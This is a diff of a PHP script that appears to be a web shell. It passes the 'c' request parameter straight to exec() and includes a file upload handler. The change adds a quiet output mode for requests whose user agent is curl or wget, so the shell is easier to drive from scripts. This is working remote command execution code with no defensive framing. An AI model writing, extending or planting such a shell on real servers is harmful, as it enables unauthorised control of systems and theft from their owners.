@@ -207,11 +207,25 @@ elseif(isset($_REQUEST['c']))
     {
         echo 'Safe mode is on, the command is by default run though escapeshellcmd() and can only run programs in safe_mod_exec_dir (' . @ini_get('safe_mode_exec_dir') . ') <br />';
     }
-    echo "<b>Command: <I>" . $_REQUEST['c'] . "</I></b><br /><br />";
+    $USER_AGENT=strtolower(substr($_SERVER['HTTP_USER_AGENT'],0,4));
+    $SILENT_MODE=TRUE;
+    if ($USER_AGENT != "curl" && $USER_AGENT != "wget")
+    {
+        $SILENT_MODE=FALSE;
+        echo "<h2>Command: <I>" . $_REQUEST['c'] . "</I></h2><br /><br />";
+    }
     trim(exec($_REQUEST['c'],$return));
     foreach($return as $val)
     {
-        echo '<pre>' . htmlentities($val) . '</pre>';
+        if ($SILENT_MODE)
+        {
+            echo htmlentities($val);
+        }
+        else
+        {
+            echo '<pre>' . htmlentities($val) . '</pre>';
+        }
+
     }
 }
 elseif(isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"]))
